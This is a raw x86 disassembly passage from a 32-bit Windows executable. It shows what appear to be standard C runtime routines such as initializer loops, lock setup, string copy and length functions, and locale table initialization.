  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
